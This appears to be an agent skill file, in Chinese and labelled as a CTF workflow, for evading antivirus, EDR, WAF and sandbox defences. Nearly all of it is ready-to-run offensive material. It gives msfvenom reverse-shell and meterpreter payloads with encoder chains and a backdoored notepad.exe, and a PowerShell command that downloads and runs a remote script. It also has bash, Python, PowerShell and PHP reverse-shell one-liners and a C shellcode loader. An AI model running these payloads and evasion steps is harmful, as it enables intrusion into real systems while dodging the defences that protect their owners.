---
name: evasion
description: triggers: EVASION, 对抗规避, 免杀, EDR绕过, WAF绕过, 沙箱逃逸, 编码, shellcode, payload, 混淆, antivirus, defense evasion
---

# EVASION 对抗规避 — CTF 自动化工作流

在 EDR/WAF/沙箱等检测下做免杀、绕过与隐匿对抗。

## 工具清单

| 工具 | 安装 | 用途 |
|---|---|---|
| msfvenom | metasploit 自带 | payload 生成 + 编码 |
| donut | 下载 release | Shellcode 生成（EXE/DLL→shellcode） |
| mingw-w64 | `scoop install mingw` | 交叉编译 |
| wafw00f | `pip install wafw00f` | WAF 识别 |
| nmap | `scoop install nmap` | 端口扫描（含规避参数） |

## 工作流：四阶段推进

### 阶段 1: 检测识别 Detection

```bash
# 1a. WAF 识别
wafw00f <target_url>

# 1b. 端口扫描规避
nmap -sS -Pn -T4 -f --mtu 24 -D RND:10 <target_ip>  # 分片 + 诱饵
nmap -sS -Pn -T4 --scan-delay 200ms <target_ip>  # 降速

# 1c. 观察响应特征
curl -v -H "User-Agent: sqlmap/1.0" <target_url>  # 发恶意 UA 看是否被拦截
curl -v -X POST -d "' OR 1=1--" <target_url>  # SQLi payload 看 WAF 反应
```

### 阶段 2: Payload 生成 Payload

```bash
# 2a. msfvenom 基础 payload
# Windows x64 reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe

# 2b. 编码规避
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x64/xor -i 10 -f exe -o payload_enc.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x64/zutto_dekiru -i 3 -f exe -o payload_zutto.exe

# 2c. 自定义模板
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x notepad.exe -k -f exe -o notepad_backdoor.exe

# 2d. 多编码链
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> \
  -e x86/shikata_ga_nai -i 5 \
  -e x64/xor -i 3 \
  -f exe -o payload_multi.exe

# 2e. 不落地 payload（powershell）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f psh-reflection -o payload.ps1
```

### 阶段 3: 加载器与执行 Loader

```bash
# 3a. donut（EXE/DLL → shellcode）
donut -i <malicious.exe> -o shellcode.bin
# 生成加载器
donut -i <malicious.exe> -f 1 -o loader.exe

# 3b. 交叉编译 C 加载器
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32

# 3c. C 加载器模板
# 虚拟内存分配 → 拷贝 shellcode → 修改保护 → 执行
# VirtualAlloc + RtlMoveMemory + VirtualProtect + CreateThread

# 3d. PowerShell 无文件执行
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<ip>/payload.ps1')"
powershell -enc <base64_encoded_command>
```

### 阶段 4: 验证与绕过 Verify

```bash
# 4a. 测试 payload 是否被拦截
# 上传 payload 到目标，看杀软反应
# 或者用在线扫描（virustotal）

# 4b. 直接连接测试
nc -lvnp <port>  # 监听
# 执行 payload，看是否回连

# 4c. 如果被拦截，迭代
# 改编码器 → 改模板 → 改 shellcode → 改加载方式
# 考虑：进程注入、DLL 侧加载、计划任务、服务

# 4d. WAF 绕过技巧
# SQLi: 用注释、大小写、URL 编码替代空格
# XSS: 用 HTML 实体、JS 编码、事件处理器
# 路径遍历: 用 ../ 替代、URL 双编码
```

## 命令模板速查

### msfvenom 最常用 payload

```bash
# Windows x64 reverse TCP
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe

# Windows x64 meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o meter.exe

# Linux x64 reverse
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf

# PHP
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw -o shell.php

# Python
msfvenom -p python/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.py

# War (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

### 无 msfvenom 时的手工 payload

```bash
# Bash reverse shell
bash -i >& /dev/tcp/<ip>/<port> 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell reverse shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PHP reverse shell
php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### C 加载器最小模板

```c
// loader.c - 编译: x86_64-w64-mingw32-gcc -O2 loader.c -o loader.exe
#include <windows.h>
int main() {
    unsigned char shellcode[] = { /* paste shellcode bytes here */ };
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

## 规避技巧速查

| 检测类型 | 规避方法 |
|---|---|
| 静态签名 | 编码(xor/aes)、变量名混淆、字符串加密 |
| 行为检测 | 进程注入、DLL 侧加载、计划任务 |
| EDR | 系统调用直接调用、PatchGuard 绕过（x64） |
| WAF | 分块传输、编码绕过、大小写、注释插入 |
| 沙箱 | 延迟执行、环境检测、用户交互触发 |

## 判定规则

1. **payload 成功绕过并回连** → 规避成功，记录技术
2. **被拦截** → 分析拦截点，切换编码/加载方式
3. **WAF 成功绕过** → 记录绕过技术

## 输出

每个成功规避：payload 类型、编码方式、加载方式、绕过技术、验证结果。